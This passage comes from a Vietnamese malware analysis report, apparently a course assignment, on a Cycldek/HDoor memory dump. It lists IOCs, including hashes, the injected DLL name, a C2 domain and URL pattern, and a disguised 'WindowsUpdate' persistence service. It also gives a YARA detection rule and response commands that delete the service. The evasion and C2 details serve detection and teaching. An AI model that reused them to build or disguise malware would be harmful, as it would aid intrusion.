+| **SHA-256 (Memory Dump)** | `b1548b6f11b5137b364878176a8ee10d5cc398e530eab306439efb7c5a3613fa` | Tệp kết xuất bộ nhớ `cleanmgr.exe_241124_222256.dmp` |
+| **MD5 (Host Binary)** | `dda6d75a02d501f77a629cd90a018e4d` | Tiến trình Windows gốc `C:\Windows\SysWOW64\cleanmgr.exe` |
+| **SHA-256 (Host Binary)** | `fd4ea3ed972ec1a89753e8152b8467dabe890493939eda9cf3e90a391c0667c2` | Tiến trình Windows gốc `C:\Windows\SysWOW64\cleanmgr.exe` |
+| **MD5 (Injected DLL)** | `aaf0789e066331645647d651022bf7e5` | Thư viện độc hại nhúng `XBoxBody.dll` |
+| **SHA-256 (Injected DLL)**| `6504c6e0136c7e03b683b899ef83e6de994ae208ce12ad2d86ce73c9919d42f1` | Thư viện độc hại nhúng `XBoxBody.dll` |
+| **Internal DLL Name** | `XBoxBody.dll` | Tên xuất xưởng trong Export Directory |
+| **Exported Function** | `ConnBody` (Ordinal 1, RVA `0xbb10`) | Hàm xuất kích hoạt payload chính |
+| **Artifact Payload File** | `SilverlightMSI.dat` | Tệp nhị phân mã hóa đặc trưng của Cycldek |
+| **C2 Domain** | `air.thaovanhoakh.com` | Máy chủ chỉ huy & điều khiển ngụy danh Khánh Hòa |
+| **C2 Ports** | `53` (DNS), `80` (HTTP), `88` (Kerberos), `8080` (Alt) | Danh sách cổng liên lạc đa kênh |
+| **C2 URL Pattern** | `http://%s:%d/search.jsp?referer=%s&kw=%s&psid=%s` | Cấu trúc URL truyền tin giả lập trang tìm kiếm |
+| **Active Bot ID** | `A2A1=3AB8` (Base64: `QTJBMT0zQUI4`) | Mã định danh thiết bị nạn nhân bị xâm nhập |
+| **Windows Service** | `WindowsUpdate` | Tên dịch vụ bám rễ hệ thống |
+| **Service Display Name** | `Microsoft Windows Update Manager` | Tên hiển thị đánh lừa người dùng |
+| **Registry Persistence**| `HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate\Parameters` | Khóa nạp `ServiceDll` tự động khi boot |
+| **Captured Evidence** | `cleanmgr.exe_241124_222256.dmp.018e35e7_00a08517.avi` | Video quay quét desktop nạn nhân (10.5 MB) |
+
+---
+
+#### 2. Quy tắc Nhận diện YARA (Detection Rule):
+
+```yara
+rule APT_Cycldek_HDoor_XBoxBody_Memory {
+    meta:
+        description = "Detects Cycldek / Goblin Panda Custom HDoor Injected Payload and C2 Pattern"
+        author = "Malware Analysis Lab"
+        date = "2026-10-01"
+        threat_actor = "Cycldek / Goblin Panda / APT27"
+        malware_family = "HDoor / Conimes"
+        reference = "cleanmgr.exe Memory Dump Analysis"
+    strings:
+        $export_dll = "XBoxBody.dll" ascii
+        $export_func = "ConnBody" ascii
+        $payload_dat = "SilverlightMSI.dat" ascii
+        $c2_format = "http://%s:%d/search.jsp?referer=%s&kw=%s&psid=%s" ascii
+        $c2_get = "GET /search.jsp?referer=%s&kw=%s&psid=%s HTTP/1.1" ascii
+        $svc_name = "WindowsUpdate" wide ascii
+        $svc_display = "Microsoft Windows Update Manager" wide ascii
+        $magic_pkt = { DD CC BB AA }
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            ($export_dll and $export_func) or
+            ($c2_format and $payload_dat) or
+            ($c2_format and $svc_name) or
+            3 of them
+        )
+}
+```
+
+#### 3. Quy trình Ứng phó & Khuyến nghị Kỹ thuật (Incident Response):
+1. **Cô lập Host & Chặn kết nối mạng:**
+   - Ngay lập tức cấu hình Firewall/Proxy chặn đứng toàn bộ lưu lượng ra vào tên miền `air.thaovanhoakh.com` và địa chỉ IP phân giải của nó trên tất cả các cổng, đặc biệt là **Cổng 53 (DNS)**, 80, 88, 8080.
+2. **Truy tìm và vô hiệu hóa Service độc hại:**
+   - Mở PowerShell quyền Administrator:
+     ```powershell
+     Stop-Service -Name "WindowsUpdate" -Force -ErrorAction SilentlyContinue
+     sc.exe delete "WindowsUpdate"
+     ```
+   - Xóa bỏ khóa Registry tương ứng:
+     ```cmd
+     reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate" /f
+     ```
+3. **Quét tìm và tiêu diệt tệp Payload:**
+   - Rà soát toàn bộ các phân vùng ổ đĩa tìm tệp `SilverlightMSI.dat` và các tệp DLL lạ được đặt cùng thư mục để xóa bỏ vĩnh viễn.
+4. **Cảnh báo giám sát Endpoint (EDR/SIEM Rule):**
+   - Thiết lập cảnh báo SOC theo dõi sự kiện **Sysmon Event ID 1 (Process Create)** và **Event ID 8 (CreateRemoteThread) / Event ID 10 (ProcessAccess)**:
+     - Báo động đỏ khi bất kỳ tiến trình hệ thống nào như `cleanmgr.exe`, `calc.exe`, `notepad.exe` khởi tạo kết nối mạng ra ngoài Internet (Network Connection).
+     - Báo động khi `cleanmgr.exe` được khởi tạo dưới cờ `CREATE_SUSPENDED` bởi một tiến trình không thuộc quyền quản lý của Task Scheduler (`taskhostw.exe`).
+
+---
+
+# TỔNG KẾT & BÀI HỌC KINH NGHIỆM
+
+Qua quá trình thực hiện bài tập thực hành phân tích tĩnh nâng cao trên hai mẫu mã độc thực tế, học viên đã đạt được các kết quả kỹ thuật cốt lõi:
+
+1. **Với Mẫu 01 (IIS Blackhat SEO Cloaking Module):**
+   - Đã làm chủ kỹ thuật nhận diện và gỡ gói (Unpacking) UPX trên tệp PE 64-bit.
+   - Thấu hiểu cơ chế hoạt động của một **Native HTTP Module trên máy chủ web IIS**, nhận diện kỹ thuật Cloaking ngụy trang giữa Googlebot và người dùng thật nhằm trục lợi tối ưu hóa tìm kiếm (SEO Poisoning).
+
+2. **Với Mẫu 02 (APT Cycldek / Custom HDoor Memory Dump):**
+   - Nâng cao kỹ năng phân tích từ file thực thi tĩnh sang kỹ thuật **Khai quật bộ nhớ (Memory Carving)** và mổ xẻ cấu trúc tiến trình bị tiêm mã.
+   - Giải mã thành công kỹ thuật trốn thoát tinh vi hàng đầu hiện nay: kết hợp **Bẻ khóa UAC / Token Impersonation** với **Process Hollowing** vào công cụ hệ thống hợp pháp (`cleanmgr.exe`).
+   - Bóc tách toàn diện hạ tầng C2 luồn lách qua cổng DNS (Port 53), quy gán chính xác nhóm tin tặc **Cycldek (Goblin Panda)** nhắm vào các cơ quan tại Việt Nam, và thu thập được bằng chứng video quay lén màn hình desktop (10.5 MB AVI) phục vụ công tác điều tra số (Digital Forensics).
+
+Báo cáo đã cung cấp đầy đủ các chỉ số IOC, quy tắc YARA nhận diện và phương án phản ứng sự cố toàn diện, đáp ứng hoàn hảo yêu cầu học phần Phân tích Mã độc.
